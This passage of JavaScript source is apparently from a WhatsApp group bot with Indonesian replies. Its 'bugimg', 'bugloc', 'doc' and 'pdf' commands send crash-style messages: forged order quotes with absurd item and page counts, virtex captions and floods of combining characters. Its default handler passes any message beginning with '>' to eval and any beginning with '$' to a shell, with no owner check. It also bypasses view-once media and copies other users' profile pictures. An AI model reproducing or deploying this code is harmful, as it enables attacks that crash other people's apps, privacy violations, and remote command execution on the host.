 tsukasa.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 tsukasa.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂??𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 break

					case 'bugimg':
					tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
	const nicko5 = fs.readFileSync(`./media/image.jpeg`)
tsukasa.sendMessage(from,nicko5,image,{mimetype: Mimetype.image,  quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } , caption: virtex9(prefix),thumbnail: virgam})
 tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
break            
case 'bugloc':
tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
tsukasa.sendMessage(from, { "degreesLatitude": 36.036105801662316,
            "degreesLongitude": 138.09072320256624,
            "name": virtex6(prefix),
            "address": emoji2(prefix),
            "jpegThumbnail": fs.readFileSync(`./media/thumbnail.jpeg`) }, location, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } })
					break  
					case 'doc': 
hmm6 = fs.readFileSync('./media/tsukasa.txt')
tsukasa.sendMessage(from, hmm6, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${ngazap(prefix)}.txt`, mimetype: 'application/txt'})
break
case 'pdf':
hm = fs.readFileSync('./media/ ꪶ𖣂ꫂ 𝘛𝘚𝘜𝘒𝘈𝘚𝘈 ボ 𝘊𝘏𝘈𝘕 〽️.pdf')
tsukasa.sendMessage(from, hm, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }, pageCount: 9999999,filename:`${ngazap(prefix)}.pdf`, mimetype: 'application/pdf',jpegThumbnail: image}) 
 break
				case 'kick':
					if (!isGroup) return reply(mess.only.group) 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, mengeluarkan :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						tsukasa.groupRemove(from, mentioned)
					} else {
						mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
						tsukasa.groupRemove(from, mentioned)
					}
					break
                case 'linkgroup':
                case 'linkgc': 
                    linkgc = await tsukasa.groupInviteCode(from)
                    reply('https://chat.whatsapp.com/'+linkgc)
                    break
                case 'leave':
                    if (!isGroup) return reply(mess.only.group)
                    if (isGroupAdmins || isOwner) {
                    	tsukasa.groupLeave(from)
                    } else {
                        reply(mess.only.admin)
                    }
                    break
case 'take':
if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}take nama|author*`)
var pembawm = body.slice(6)
var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media = await tsukasa.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
var packname = pembawm.split('|')[0]
var author = pembawm.split('|')[1]
exif.create(packname, author, `takestick_${sender}`)
exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('Error')
tsukasa.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
})
break
				case 'simi':
					if (args.length < 1) return reply('Textnya mana um?')
					teks = body.slice(5)
					anu = await simih(teks) //fetchJson(`https://mhankbarbars.herokuapp.com/api/samisami?text=${teks}`, {method: 'get'})
					//if (anu.error) return reply('Simi ga tau kak')
					reply(anu)
					break
				case 'simih':
					if (!isGroup) return reply(mess.only.group)
					//if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isSimi) return reply('Mode simi sudah aktif')
						samih.push(from)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Sukses mengaktifkan mode simi di group ini 🔥')
					} else if (Number(args[0]) === 0) {
						samih.splice(from, 1)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Sukes menonaktifkan mode simi di group ini 🔥')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
				case 'welcome': 
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Udah aktif um')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Sukses mengaktifkan fitur welcome di group ini 🔥')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Sukses menonaktifkan fitur welcome di group ini 🔥')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
                                      break
				case 'clone': 
					if (args.length < 1) return reply('Tag target yang ingin di clone')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
					try {
						pp = await tsukasa.getProfilePicture(id)
						buffer = await getBuffer(pp)
						tsukasa.updateProfilePicture(botNumber, buffer)
						mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
					} catch (e) {
						reply('Gagal om')
					}
					break
					case 'viewonce':
					if (isQuotedImage) {
            const viewonce = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            oneclick = await tsukasa.downloadMediaMessage(viewonce)
            tsukasa.sendMessage(from, oneclick, image,{quoted:mek ,viewOnce : true}) 
            } else {
            reply('Reply gambarnya!')
            }
            break
				case 'wait':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						reply(mess.wait)
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						media = await tsukasa.downloadMediaMessage(encmedia)
						await wait(media).then(res => {
							tsukasa.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
						}).catch(err => {
							reply(err)
						})
					} else {
						reply('Foto aja mas')
					}
					break
  
				default:
				if (budy.startsWith('>')){
console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
ras = budy.slice(1)
function _(rem) {
ren = JSON.stringify(rem,null,2)
pes = util.format(ren)
reply(pes)
}
try{q
reply(require('util').format(eval(`(async () => { ${ras} })()`)))
} catch(err) {
e = String(err)
reply(e)
}
}
				if (chats.startsWith('$')){
if (!q)return 
var itsme = `${sender}`
var split = `ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(q, (err, stdout) => {
if (err) return tsukasa.sendMessage(from, ` ${err}`, text, { quoted: mek })
if (stdout) {
tsukasa.sendMessage(from, stdout, text, term)
}
})
} 				
				if (budy.startsWith('x')){
try {
  if (!mek.key.fromMe)return reply('Only Owner')
return tsukasa.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
} 				
					if (isGroup && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						console.log(muehe)
						reply(muehe)
					} else {
						return //console.log(color('[WARN]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}
starts()